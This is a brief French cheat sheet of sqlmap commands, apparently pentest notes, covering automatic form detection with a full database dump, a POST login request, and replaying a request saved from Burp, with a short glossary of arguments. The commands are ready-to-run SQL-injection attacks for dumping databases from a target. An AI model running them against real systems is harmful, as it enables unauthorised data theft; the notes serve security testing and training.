# Dump et form récupéré automatiquement 
```bash
sqlmap -u x.x.x.x --forms --dump 
```

# POST
```bash
sqlmap --method POST -u x.x.x.x --data 'log_email=toto@toto.fr&log_password=PWD&login_button=Login' 
```

# Utiliser une requête sauvegardée de Burp
Faire un "Save Item" de la requête dans Burp 

```bash
sqlmap –r req.txt --dump
```

Explication des arguments
  - -r => Fichier de requête à utiliser (par exemple provenant de Burp)
  - -u => Url ou IP du site à attaquer
  - --data => Body à utiliser
  - --dump => Dump de la base en sortie
  - --forms => Récupérer le "form" de la page attaquée
  - --method => Verb HTTP à utiliser
